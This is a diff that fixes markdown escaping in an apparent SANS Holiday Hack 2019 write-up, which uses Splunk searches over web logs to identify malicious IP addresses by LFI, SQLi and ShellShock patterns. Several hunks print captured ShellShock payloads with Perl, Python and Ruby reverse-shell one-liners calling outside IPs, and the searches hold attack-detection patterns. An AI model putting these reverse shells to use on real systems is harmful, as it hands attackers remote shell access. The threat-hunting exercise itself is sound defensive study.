@@ -32,7 +32,7 @@ So this is the part we do the cranpi Terminal..., the terminal was made for us t
 
 [![](/assets/images/json-jq-duration.jpg)](/assets/images/json-jq-duration.jpg)
 
-cat conn.log | jq -s 'sort\_by(.duration) | reverse| .\[0\]'
+cat conn.log | jq -s 'sort_by(.duration) | reverse| .[0]'
 
 Once we solve the terminal challenge Wunrose gives us very important tips about the task ahead:
 
@@ -120,7 +120,7 @@ LFI on uri field
 
 [![](/assets/images/srf-search-user_agent.jpg)](/assets/images/srf-search-user_agent.jpg)
 
-SQLi and ShellShock on user\_agent field
+SQLi and ShellShock on user_agent field
 
 [![](/assets/images/srf-search-username.jpg)](/assets/images/srf-search-username.jpg)
 
@@ -128,7 +128,7 @@ SQLi on username field
 
 Let's start counting what we have for each interesting field:
 
-> index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) | stats values(id.orig\_h) AS src\_ips count(id.orig\_h) AS num\_src\_ip by **<INSERT INTERESTING FIELD NAME>** | search  **<INSERT INTERESTING FIELD NAME>** IN ("\*<\*" , "\*'\*" ,  "\*\`\*" , \*/../\* , "() { :; };\*"  , \*/passwd\* , \*/etc/\*)
+> index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) | stats values(id.orig_h) AS src_ips count(id.orig_h) AS num_src_ip by **<INSERT INTERESTING FIELD NAME>** | search  **<INSERT INTERESTING FIELD NAME>** IN ("\*<\*" , "\*'\*" ,  "\*\`\*" , \*/../\* , "() { :; };\*"  , \*/passwd\* , \*/etc/\*)
 
 [![](/assets/images/srf-search-count_host.jpg)](/assets/images/srf-search-count_host.jpg)
 
@@ -152,7 +152,7 @@ One (1) Attack to the username field from 4 different IP addresses
 
 [![](/assets/images/srf-search-count_user_agent.jpg)](/assets/images/srf-search-count_user_agent.jpg)
 
-13 Attacks to the user\_agent field by 15 different IP addresses
+13 Attacks to the user_agent field by 15 different IP addresses
 
 So we have:
 
@@ -160,19 +160,19 @@ IP addresses attacking the host field: 7
 
 IP addresses attacking the username field: 4
 
-IP addresses attacking the user\_agent field: 15
+IP addresses attacking the user_agent field: 15
 
 IP addresses attacking the uri field: 39
 
 Total: **65** different IP addresses that matches our original search, we are missing 2 of our original search. 
 
-The 2 missing are false positives from the resp\_filename field, so we make sure to add a filter in our search to remove those events.
+The 2 missing are false positives from the resp_filename field, so we make sure to add a filter in our search to remove those events.
 
 [![](/assets/images/srf-search-count_resp_file.jpg)](/assets/images/srf-search-count_resp_file.jpg)
 
 False Positives to remove
 
-we add resp\_filenames!=Ned\_\* to our main search
+we add resp_filenames!=Ned\_\* to our main search
 
 This means we're on track and can use that search as a base search, now we need to find the 45 IP addresses left by pivoting into one of interesting field as hinted.
 
@@ -193,19 +193,19 @@ Known tools:
 
 -   Mozilla/4.0 (compatible; **Metasploit** RSPEC)
 
-So let's pivot on the ***user\_agent*** to see if we find other suspicious IP addresses
+So let's pivot on the ***user_agent*** to see if we find other suspicious IP addresses
 
-We can make a join of two searches to pivot on the user\_agent, but first we need to increase the limit in Splunk's limits.conf to be able to generate more than 50000 results in a subsearch:
+We can make a join of two searches to pivot on the user_agent, but first we need to increase the limit in Splunk's limits.conf to be able to generate more than 50000 results in a subsearch:
 
-\[join\]
-subsearch\_maxout = 60000 ← The file has over 50000 events
-subsearch\_maxtime = 90 ← A little bit extra
-subsearch\_timeout = 180 ← A little bit extra just in case
-index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) resp\_filenames!=Ned\_\* 
-**| join user\_agent max=0 \[search index=hh2019\]**
-| table status\_code id.orig\_h user\_agent username extracted\_host uri| sort - user\_agent 
-| rename id.orig\_h AS orig\_h 
-| stats values(orig\_h) AS ips dc(orig\_h) AS num\_ips count by user\_agent
+[join]
+subsearch_maxout = 60000 ← The file has over 50000 events
+subsearch_maxtime = 90 ← A little bit extra
+subsearch_timeout = 180 ← A little bit extra just in case
+index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) resp_filenames!=Ned\_\* 
+**| join user_agent max=0 [search index=hh2019]**
+| table status_code id.orig_h user_agent username extracted_host uri| sort - user_agent 
+| rename id.orig_h AS orig_h 
+| stats values(orig_h) AS ips dc(orig_h) AS num_ips count by user_agent
 This gives us an interesting result, there are 19 unique User-Agents used by 19 unique malicious IP addresses, there are 36 User-Agents used by 2 different IP addresses each, so that makes it 72 malicious IP addresses, there is 1 User-Agents (a SQLi) used by 3 malicious IP addresses, and the rest are User-Agents used by more than 9 IP addresses.
 The next table shows the User-Agents with 2 or less malicious IP addresses (79 IP addresses)
 
@@ -230,7 +230,7 @@ Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-
 44.164.136.41
 49.161.8.58
 
-Mozilla/4.0 (compatible MSIE 5.0;Windows\_98)
+Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
 
 23.49.177.78
 249.237.77.152
@@ -295,7 +295,7 @@ Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.43
 140.60.154.239
 75.73.228.192
 
-Mozilla/4.0 (compatible; MSIE 8.0; Windows\_NT 5.1; Trident/4.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
 
 102.143.16.184
 226.102.56.13
@@ -346,7 +346,7 @@ Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTM
 
 80.244.147.207
 
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_10\_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
 
 123.127.233.97
 
@@ -385,11 +385,11 @@ Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
 2.230.60.70
 34.155.174.167
 
-Mozilla/5.0 (iPhone; CPU iPhone OS 10\_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1
 
 61.110.82.125
 
-Mozilla/5.0 (iPhone; CPU iPhone OS 10\_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1
 
 65.153.114.120
 
@@ -439,7 +439,7 @@ IP Addresses
 
 31.254.228.4
 
-() { :; }; /usr/bin/perl -e 'use Socket;$i="83.0.8.119";$p=57432;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+() { :; }; /usr/bin/perl -e 'use Socket;$i="83.0.8.119";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 83.0.8.119
 
@@ -447,11 +447,11 @@ IP Addresses
 
 229.229.189.246
 
-() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("150.45.133.97",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
+() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("150.45.133.97",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 150.45.133.97
 
-() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open("227.110.45.126",43870).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open("227.110.45.126",43870).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 227.110.45.126
 
@@ -487,9 +487,9 @@ IP Addresses
 
 We have found 94 Malicious IP addresses, now we need to find the last 6 malicious onces related to 7 User-Agents being used by more than 9 IP addresses each:
 
-Mozilla/4.0 (compatible; MSIE 5.13; Mac\_PowerPC)
+Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)
 
-Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10\_4\_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22
 
 Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5
 
@@ -501,17 +501,17 @@ Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0
 
 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5
 
-We use our original search and add specific user\_agent fields.
+We use our original search and add specific user_agent fields.
 index="hh2019" sourcetype="\_json" ("\*<\*" OR "\*'\*" OR  "\*\`\*" OR \*/../\* OR "() { :; };"  OR \*/passwd\* OR \*/etc/\*) 
- user\_agent IN (
-"Mozilla/4.0 (compatible; MSIE 5.13; Mac\_PowerPC)",
-"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10\_4\_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22",
-"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10\_4\_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
-"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10\_4\_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
+ user_agent IN (
+"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22",
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22", 
 "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)",
 "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5")
-| stats count by id.orig\_h | fields - count
+| stats count by id.orig_h | fields - count
 This gives 7 more IP addresses, that's actually one more than we needed.
 
 [![](/assets/images/srf-count-ua-lost-sqli-lfi.jpg)](/assets/images/srf-count-ua-lost-sqli-lfi.jpg)
@@ -530,13 +530,13 @@ On page 3
 
 We scanned the webserver looking for a git repo (.git folder) without luck, but remembered the document says the information is in the readme, which means there's probably a README.md file somewhere.
 We go back to Splunk and look for that string, luckily someone read it
-index="hh2019" sourcetype="\_json" Readme.md | table method uri status\_code
+index="hh2019" sourcetype="\_json" Readme.md | table method uri status_code
 
 [method](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)
 
 [](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)[uri](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)
 
-[](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)[status\_code](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)
+[](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)[status_code](http://10.20.10.22:8000/en-US/app/search/search?q=search%20index%3D%22hh2019%22%20sourcetype%3D%22_json%22%20Readme.md%20%7C%20table%20method%20uri%20status_code&earliest=0&latest=&display.page.search.mode=verbose&dispatch.sample_ratio=1&workload_pool=&display.page.search.tab=statistics&display.general.type=statistics&display.events.fields=%5B%22username%22%2C%22user_agent%22%2C%22uri%22%2C%22extracted_host%22%2C%22id.orig_h%22%5D&display.prefs.fieldFilter=id&display.statistics.format.0=color&display.statistics.format.0.scale=minMidMax&display.statistics.format.0.colorPalette=minMidMax&display.statistics.format.0.field=num_src_ip&display.statistics.wrap=1&display.statistics.totalsRow=0&display.statistics.format.0.colorPalette.minColor=%23FFFFFF&display.statistics.format.0.colorPalette.maxColor=%2353A051&display.statistics.rowNumbers=0&display.general.enablePreview=1&display.statistics.drilldown=cell&sid=1579064203.331#)
 
 GET
 
